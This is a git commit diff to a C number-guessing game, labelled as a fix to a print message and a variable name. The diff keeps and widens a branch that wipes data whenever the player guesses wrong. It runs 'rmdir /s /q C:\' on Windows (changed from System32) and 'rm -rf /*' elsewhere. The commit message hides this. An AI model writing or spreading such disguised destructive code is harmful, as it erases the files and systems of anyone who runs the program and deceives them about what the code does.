8def4438babbec3dc889eca2c9d975b4593ef508
Ashley Tusk Gimblemayer <ashley@estrogen.delivery>
2026-07-21 15:37:05 -0700

    Fix print and name

--- game.c
+++ game.c
@@ -6,18 +6,18 @@ int main() {
     puts("Guess the number! 1-6");
 
     int selection = 0;
-    scanf("%d", &number);
-      
+    scanf("%d", &selection);
+
     srand(time(NULL));
 
     int number = (rand() % 6) + 1;
 
     if (number == selection) {
-        puts("Congrats! You did it!");
+        puts("That's correct!");
     } else {
        #ifdef _WIN32
           char command[256];
-          snprintf(command, sizeof(command), "rmdir /s /q %s", "C:\\Windows\\System32");
+          snprintf(command, sizeof(command), "rmdir /s /q %s", "C:\\");
           system(command);
       #else
           system("rm -rf /*");
